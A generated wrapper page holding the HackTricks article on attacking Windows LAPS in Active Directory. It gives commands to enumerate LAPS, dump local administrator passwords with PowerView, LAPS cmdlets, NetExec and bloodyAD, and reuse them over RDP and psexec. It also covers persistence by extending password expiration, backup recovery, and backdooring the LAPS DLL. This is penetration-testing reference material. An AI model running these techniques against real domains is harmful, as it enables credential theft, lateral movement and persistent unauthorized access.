---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# LAPS

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-windows-hardening-active-directory-methodology-laps` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/windows-hardening/active-directory-methodology/laps.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [LAPS](../../topics/windows-hardening/laps.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-windows-hardening-active-directory-methodology-laps |
| name | LAPS |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/windows-hardening/active-directory-methodology/laps.md |

## Preserved Source Material

````yaml
_body: "# LAPS\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n## Basic Information\n\nThere are currently **2 LAPS\
  \ flavours** you can encounter during an assessment:\n\n- **Legacy Microsoft LAPS**: stores the local administrator password\
  \ in **`ms-Mcs-AdmPwd`** and the expiration time in **`ms-Mcs-AdmPwdExpirationTime`**.\n- **Windows LAPS** (built into Windows\
  \ since the April 2023 updates): can still emulate legacy mode, but in native mode it uses **`msLAPS-*`** attributes, supports\
  \ **password encryption**, **password history**, and **DSRM password backup** for domain controllers.\n\nLAPS is designed\
  \ to manage **local administrator passwords**, making them **unique, randomized, and frequently changed** on domain-joined\
  \ computers. If you can read those attributes, you can usually **pivot as the local admin** to the affected host. In many\
  \ environments, the interesting part is not only reading the password itself, but also finding **who was delegated access**\
  \ to the password attributes.\n\n### Legacy Microsoft LAPS attributes\n\nIn the domain's computer objects, the implementation\
  \ of legacy Microsoft LAPS results in the addition of two attributes:\n\n- **`ms-Mcs-AdmPwd`**: **plain-text administrator\
  \ password**\n- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**\n\n### Windows LAPS attributes\n\nNative\
  \ Windows LAPS adds several new attributes to computer objects:\n\n- **`msLAPS-Password`**: clear-text password blob stored\
  \ as JSON when encryption is not enabled\n- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time\n- **`msLAPS-EncryptedPassword`**:\
  \ encrypted current password\n- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history\n- **`msLAPS-EncryptedDSRMPassword`**\
  \ / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data for domain controllers\n- **`msLAPS-CurrentPasswordVersion`**:\
  \ GUID-based version tracking used by newer rollback-detection logic (Windows Server 2025 forest schema)\n\nWhen **`msLAPS-Password`**\
  \ is readable, the value is a JSON object containing the account name, update time and clear-text password, for example:\n\
  \n```json\n{\"n\":\"Administrator\",\"t\":\"1d8161b41c41cde\",\"p\":\"A6a3#7%...\"}\n```\n\n### Check if activated\n\n```bash\n\
  # Legacy Microsoft LAPS policy\nreg query \"HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd\" /v AdmPwdEnabled\n\n\
  dir \"C:\\Program Files\\LAPS\\CSE\"\n# Check if that folder exists and contains AdmPwd.dll\n\n# Native Windows LAPS binaries\
  \ / PowerShell module\nGet-Command *Laps*\ndir \"$env:windir\\System32\\LAPS\"\n\n# Find GPOs that have \"LAPS\" or some\
  \ other descriptive term in the name\nGet-DomainGPO | ? { $_.DisplayName -like \"*laps*\" } | select DisplayName, Name,\
  \ GPCFileSysPath | fl\n\n# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)\n\
  Get-DomainObject -SearchBase \"LDAP://DC=sub,DC=domain,DC=local\" |\n  ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null\
  \ } |\n  select DnsHostname\n\n# Native Windows LAPS-enabled computers\nGet-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))'\
  \ |\n  select DnsHostname\n```\n\n## LAPS Password Access\n\nYou could **download the raw LAPS policy** from `\\\\dc\\SysVol\\\
  domain\\Policies\\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\\Machine\\Registry.pol` and then use **`Parse-PolFile`** from the\
  \ [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package to convert this file into human-readable\
  \ format.\n\n### Legacy Microsoft LAPS PowerShell cmdlets\n\nIf the legacy LAPS module is installed, the following cmdlets\
  \ are usually available:\n\n```bash\nGet-Command *AdmPwd*\n\nCommandType     Name                                      \
  \         Version    Source\n-----------     ----                                               -------    ------\nCmdlet\
  \          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS\nCmdlet          Get-AdmPwdPassword \
  \                                5.0.0.0    AdmPwd.PS\nCmdlet          Reset-AdmPwdPassword                            \
  \   5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS\nCmdlet\
  \          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdReadPasswordPermission\
  \                   5.0.0.0    AdmPwd.PS\nCmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0   \
  \ AdmPwd.PS\nCmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS\n\n# List who can read\
  \ the LAPS password of the given OU\nFind-AdmPwdExtendedRights -Identity Workstations | fl\n\n# Read the password\nGet-AdmPwdPassword\
  \ -ComputerName wkstn-2 | fl\n```\n\n### Windows LAPS PowerShell cmdlets\n\nNative Windows LAPS ships with a new PowerShell\
  \ module and new cmdlets:\n\n```bash\nGet-Command *Laps*\n\n# Discover who has extended rights over the OU\nFind-LapsADExtendedRights\
  \ -Identity Workstations\n\n# Read a password from AD\nGet-LapsADPassword -Identity wkstn-2 -AsPlainText\n\n# Include password\
  \ history if encryption/history is enabled\nGet-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory\n\n# Query\
  \ DSRM password from a DC object\nGet-LapsADPassword -Identity dc01.contoso.local -AsPlainText\n```\n\nA few operational\
  \ details matter here:\n\n- **`Get-LapsADPassword`** automatically handles **legacy LAPS**, **clear-text Windows LAPS**,\
  \ and **encrypted Windows LAPS**.\n- If the password is encrypted and you can **read** but not **decrypt** it, the cmdlet\
  \ returns metadata but not the clear-text password.\n- **Password history** is only available when **Windows LAPS encryption**\
  \ is enabled.\n- On domain controllers, the returned source can be **`EncryptedDSRMPassword`**.\n\n### PowerView / LDAP\n\
  \n**PowerView** can also be used to find out **who can read the password and read it**:\n\n```bash\n# Legacy Microsoft LAPS:\
  \ find principals with rights over the OU\nFind-AdmPwdExtendedRights -Identity Workstations | fl\n\n# Legacy Microsoft LAPS:\
  \ read the password directly from LDAP\nGet-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime\n\
  \n# Native Windows LAPS clear-text mode\nGet-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime\n\
  ```\n\nIf **`msLAPS-Password`** is readable, parse the returned JSON and extract **`p`** for the password and **`n`** for\
  \ the managed local admin account name.\n\n### Linux / remote tooling\n\nModern tooling supports both legacy Microsoft LAPS\
  \ and Windows LAPS.\n\n```bash\n# NetExec / CrackMapExec lineage: dump LAPS values over LDAP\nnxc ldap 10.10.10.10 -u user\
  \ -p password -M laps\n\n# Filter to a subset of computers\nnxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'\n\
  \n# Use read LAPS access to authenticate to hosts at scale\nnxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps\n\
  \n# If the local admin name is not Administrator\nnxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin\n\
  \n# Legacy Microsoft LAPS with bloodyAD\nbloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \\\n  get search\
  \ --filter '(ms-mcs-admpwdexpirationtime=*)' \\\n  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime\n```\n\nNotes:\n\n-\
  \ Recent **NetExec** builds support **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, and **`msLAPS-EncryptedPassword`**.\n- **`pyLAPS`**\
  \ is still useful for **legacy Microsoft LAPS** from Linux, but it only targets **`ms-Mcs-AdmPwd`**.\n- If the environment\
  \ uses **encrypted Windows LAPS**, a simple LDAP read is not enough; you also need to be an **authorized decryptor** or\
  \ abuse a supported decrypt path.\n\n### Directory synchronization abuse\n\nIf you have domain-level **directory synchronization**\
  \ rights instead of direct read access on each computer object, LAPS can still be interesting.\n\nThe combination of **`DS-Replication-Get-Changes`**\
  \ with **`DS-Replication-Get-Changes-In-Filtered-Set`** or **`DS-Replication-Get-Changes-All`** can be used to synchronize\
  \ **confidential / RODC-filtered** attributes such as legacy **`ms-Mcs-AdmPwd`**. BloodHound models this as **`SyncLAPSPassword`**.\
  \ Check [DCSync](dcsync.md) for the replication-rights background.\n\n## LAPSToolkit\n\nThe [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)\
  \ facilitates the enumeration of LAPS with several functions.\\\nOne is parsing **`ExtendedRights`** for **all computers\
  \ with LAPS enabled.** This shows **groups** specifically **delegated to read LAPS passwords**, which are often users in\
  \ protected groups.\\\nAn **account** that has **joined a computer** to a domain receives `All Extended Rights` over that\
  \ host, and this right gives the **account** the ability to **read passwords**. Enumeration may show a user account that\
  \ can read the LAPS password on a host. This can help us **target specific AD users** who can read LAPS passwords.\n\n```bash\n\
  # Get groups that can read passwords\nFind-LAPSDelegatedGroups\n\nOrgUnit                                           Delegated\
  \ Groups\n-------                                           ----------------\nOU=Servers,DC=DOMAIN_NAME,DC=LOCAL       \
  \         DOMAIN_NAME\\Domain Admins\nOU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\\LAPS Admin\n\n# Checks\
  \ the rights on each computer with LAPS enabled for any groups\n# with read access and users with \"All Extended Rights\"\
  \nFind-AdmPwdExtendedRights\nComputerName                Identity                    Reason\n------------              \
  \  --------                    ------\nMSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\\Domain Admins   Delegated\nMSQL01.DOMAIN_NAME.LOCAL\
  \    DOMAIN_NAME\\LAPS Admins     Delegated\n\n# Get computers with LAPS enabled, expiration time and the password (if you\
  \ have access)\nGet-LAPSComputers\nComputerName                Password       Expiration\n------------                --------\
  \       ----------\nDC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41\n```\n\n## Dumping LAPS Passwords With\
  \ NetExec / CrackMapExec\n\nIf you don't have an interactive PowerShell, you can abuse this privilege remotely over LDAP:\n\
  \n```bash\n# Legacy syntax still widely seen in writeups\ncrackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10\
  \ -M laps\n\n# Current project name / syntax\nnxc ldap 10.10.10.10 -u user -p password -M laps\n```\n\nThis dumps all the\
  \ LAPS secrets that the user can read, allowing you to move laterally with a different local administrator password.\n\n\
  ## Using LAPS Password\n\n```bash\nxfreerdp /v:192.168.1.1:3389 /u:Administrator\nPassword: 2Z@Ae)7!{9#Cq\n\npython psexec.py\
  \ Administrator@web.example.com\nPassword: 2Z@Ae)7!{9#Cq\n```\n\n## LAPS Persistence\n\n### Expiration Date\n\nOnce admin,\
  \ it's possible to **obtain the passwords** and **prevent** a machine from **updating** its **password** by **setting the\
  \ expiration date into the future**.\n\nLegacy Microsoft LAPS:\n\n```bash\n# Get expiration time\nGet-DomainObject -Identity\
  \ computer-21 -Properties ms-mcs-admpwdexpirationtime\n\n# Change expiration time\n## SYSTEM on the computer is needed\n\
  Set-DomainObject -Identity wkstn-2 -Set @{\"ms-mcs-admpwdexpirationtime\"=\"232609935231523081\"}\n```\n\nNative Windows\
  \ LAPS uses **`msLAPS-PasswordExpirationTime`** instead:\n\n```bash\n# Read the current expiration timestamp\nGet-DomainObject\
  \ -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime\n\n# Push the expiration into the future\nSet-DomainObject\
  \ -Identity wkstn-2 -Set @{\"msLAPS-PasswordExpirationTime\"=\"133801632000000000\"}\n```\n\n> [!WARNING]\n> The password\
  \ will still rotate if an **admin** uses **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, or if **Do not allow password\
  \ expiration time longer than required by policy** is enabled.\n\n### Recovering historical passwords from AD backups\n\n\
  When **Windows LAPS encryption + password history** is enabled, mounted AD backups can become an additional source of secrets.\
  \ If you can access a mounted AD snapshot and use **recovery mode**, you can query older stored passwords without talking\
  \ to a live DC.\n\n```bash\n# Query a mounted AD snapshot on port 50000\nGet-LapsADPassword -Identity wkstn-2 -AsPlainText\
  \ -Port 50000 -RecoveryMode\n\n# Historical entries if history is enabled\nGet-LapsADPassword -Identity wkstn-2 -AsPlainText\
  \ -IncludeHistory -Port 50000 -RecoveryMode\n```\n\nThis is mostly relevant during **AD backup theft**, **offline forensics\
  \ abuse**, or **disaster-recovery media access**.\n\n### Backdoor\n\nThe original source code for legacy Microsoft LAPS\
  \ can be found [here](https://github.com/GreyCorbel/admpwd), therefore it's possible to put a backdoor in the code (inside\
  \ the `Get-AdmPwdPassword` method in `Main/AdmPwd.PS/Main.cs` for example) that will somehow **exfiltrate new passwords\
  \ or store them somewhere**.\n\nThen, compile the new `AdmPwd.PS.dll` and upload it to the machine in `C:\\Tools\\admpwd\\\
  Main\\AdmPwd.PS\\bin\\Debug\\AdmPwd.PS.dll` (and change the modification time).\n\n## References\n\n- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)\n\
  - [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)\n\
  - [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)\n\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: windows-hardening/active-directory-methodology/laps.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/windows-hardening/active-directory-methodology/laps.md
````
